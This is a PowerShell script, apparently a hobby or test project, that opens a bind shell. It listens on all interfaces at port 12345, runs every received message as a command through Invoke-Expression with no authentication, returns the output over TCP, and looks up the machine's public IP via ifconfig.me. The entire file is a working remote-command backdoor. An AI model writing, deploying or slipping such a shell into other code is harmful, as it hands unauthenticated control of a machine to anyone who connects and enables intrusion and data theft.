    # Switch at some point to generate info dynamically
    if($HomeAddr -eq $null -Or $HomePort -eq $null){
    #     Write-Host "Specify home address and port"
    #     Write-Host "Home Address: " -NoNewLine
    #     $HomeAddr = Read-Host
    #     Write-Host "Home Port: " -NoNewLine
    #     $HomePort = Read-Host
    # For practical purposes, bind on all addresses 
    # Ideally, the port would be chosen at generation. However, I'm keeping it 12345 for testing. 
    $HomeAddr = "0.0.0.0"
    $HomePort = 12345
    }
    # IDK, send this after server is established ig
    $HomeExt = (invoke-webrequest -uri ifconfig.me).Content

    # New TCP Listener object
    $Server = New-Object System.Net.Sockets.TcpListener($HomeAddr, $HomePort)
    # New Buffer object to hold the converted messages in bytes
    $Buff = New-Object System.Byte[] 1024
    # Object to ascii encode the messages
    $Enc = New-Object System.Text.AsciiEncoding
    # Start the server
    $Server.start()
    # Forever
    while ($true){
        # Accept a client
        $Client = $Server.AcceptTcpClient()
        # Get the client message stream
        $Stream = $Client.GetStream()
        # While the byte stream is not 0 (e.g., still incoming)
        while (($i = $Stream.Read($Buff,0,$Buff.Length)) -ne 0){
            # Convert the bytes to string
            $Resp = $Enc.GetString($Buff,0,$i)
            # Quit message
            try{
                # Run the recieved message as a command
                $Comm = (Invoke-Expression $Resp | out-String)
                # Encode the command output
                $Data = $Enc.GetBytes($Comm)
                $Blank = New-Object byte[] 1024
                $End = $Enc.GetBytes("EndMessage")
                # Send it to the client
                $Stream.Write($Data,0,$Data.Length)
                $Stream.Write($Blank,0,$Blank.Length)
                $Stream.Write($End,0,$End.Length)
                $Stream.Write($Blank,0,$Blank.Length)
                }catch{
                    $Data = $Enc.GetBytes($Error[0])
                    $Newl = $Enc.GetBytes("`n")
                    $Blank = New-Object byte[] 1024
                    $End = $Enc.GetBytes("EndMessage")
                    $Stream.Write($Data,0,$Data.Length)
                    $Stream.Write($Newl,0,$Newl.Length)
                    $Stream.Write($Blank,0,$Blank.Length)
                    $Stream.Write($End,0,$End.Length)
                    $Stream.Write($Blank,0,$Blank.Length)   
            }
        }
        $Stream.Close()
    }
